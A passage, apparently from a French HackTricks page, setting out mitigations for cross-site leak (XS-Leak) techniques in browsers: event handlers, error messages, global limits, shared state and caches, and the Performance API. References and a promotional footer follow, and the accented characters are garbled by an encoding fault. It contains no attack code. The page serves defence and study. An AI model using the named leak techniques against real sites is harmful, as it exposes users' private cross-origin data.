* **Gestionnaire d'√©v√©nements**. L'att√©nuation la plus efficace pour cette technique de fuite serait de **les refuser toutes**, mais cela compromettrait la majorit√© des applications Web sur Internet. Nous proposons donc de **r√©duire le nombre d'informations n√©cessaires qui peuvent √™tre collect√©es dans les √©v√©nements**. Par exemple, l'√©v√©nement de violation de la CSP ne doit pas contenir l'URL de redirection cible dans le champ blockedURI. Ce comportement est impl√©ment√© dans FF et dans les versions plus r√©centes de GC - SA reste vuln√©rable.
* **Messages d'erreur**. Pour att√©nuer les XS-Leaks bas√©es sur la technique de fuite des messages d'erreur, il y a deux exigences majeures. Premi√®rement, **les messages d'erreur ne doivent pas contenir d'informations d√©taill√©es**, de la m√™me mani√®re que les messages des gestionnaires d'√©v√©nements. Deuxi√®mement, les navigateurs doivent **minimiser les occurrences de messages d'erreur**. Les XS-Leaks tels que SRI Error, ContentDocument XFO ou Fetch Redirect d√©tectent si un message d'erreur est g√©n√©r√© ou non.
* **Limites globales**. La correction des techniques de fuite qui exploitent les limites globales est relativement complexe car elles reposent sur des restrictions physiques. La recommandation g√©n√©rale est donc de **restreindre les limites globales sur une petite base par site**. Si la limite globale est de 1, comme pour l'API de paiement, l'attaquant peut tenter silencieusement d'activer l'interface utilisateur de paiement Web √† tout moment, ce qui r√©ussit uniquement si l'interface utilisateur n'est pas utilis√©e simultan√©ment par un autre onglet. Nous recommandons d'acc√©der √† l'API de paiement uniquement lorsqu'un √©v√©nement de confiance a √©t√© utilis√©. Ainsi, la limite globale est fix√©e √† z√©ro sauf si l'utilisateur donne son consentement, par exemple en cliquant avec le bouton gauche de la souris sur une fen√™tre de dialogue, ce qui fixe la limite globale √† un.
* **√âtat global**. Toute **propri√©t√© de l'√©tat global d'un navigateur ne doit pas √™tre accessible**. Par exemple, FF est le seul navigateur qui met √† jour l'historique de l'√©tat global lorsqu'une redirection se produit, ce qui entra√Æne la lecture de history.length. Les navigateurs devraient cr√©er une nouvelle propri√©t√© d'historique lorsqu'une redirection se produit au lieu de la stocker globalement. D'autres exemples sont les ressources partag√©es, telles que les caches. Les fuites de cache exploitent le cache partag√© utilis√© pour tous les sites ouverts dans un navigateur. Pour att√©nuer compl√®tement les techniques de fuite de cache, le cache HTTP doit √™tre partitionn√© sur une base par site, comme cela est mis en ≈ìuvre par SA, GC et FF. Notez que dans SA, les iframes ne sont pas affect√©s par la partition du cache.
* **API de performance**. Nous avons prouv√© que l'API de performance est une excellente technique de fuite. Dans de nombreux XS-Leaks, nous avons pu d√©tecter la diff√©rence entre une r√©ponse de requ√™te cross-origin ayant ou n'ayant pas une entr√©e de performance. Pour une unification, nous recommandons de s'assurer que toutes les requ√™tes doivent cr√©er une telle entr√©e et que seul le sous-ensemble correct d'informations de synchronisation est enregistr√© pour les requ√™tes cross-origin.
## R√©f√©rences

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour cr√©er et **automatiser facilement des workflows** aliment√©s par les outils communautaires les plus avanc√©s au monde.\
Obtenez un acc√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
